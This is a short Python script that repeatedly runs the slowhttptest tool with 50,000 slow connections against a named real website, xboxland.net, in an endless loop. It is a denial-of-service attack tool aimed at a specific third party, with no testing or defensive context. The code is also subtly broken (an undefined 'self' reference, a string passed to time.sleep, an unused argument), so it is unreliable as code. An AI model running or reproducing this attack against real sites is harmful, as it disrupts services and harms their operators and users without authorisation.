#!/usr/bin/python3
from subprocess import Popen, PIPE
import time
import sys

#print(sys.argv[1])
sleep = sys.argv[1]
attack = sys.argv[2]
while 1:
    print("F#CK!")
    process = Popen(['slowhttptest', '-c', '50000', '-i', '5', '-l', '300', '-u', 'http://www.xboxland.net'], stdout=PIPE, stderr=PIPE)
    stdout, self.stderr = process.communicate()
    print (stdout)
    time.sleep(sleep)
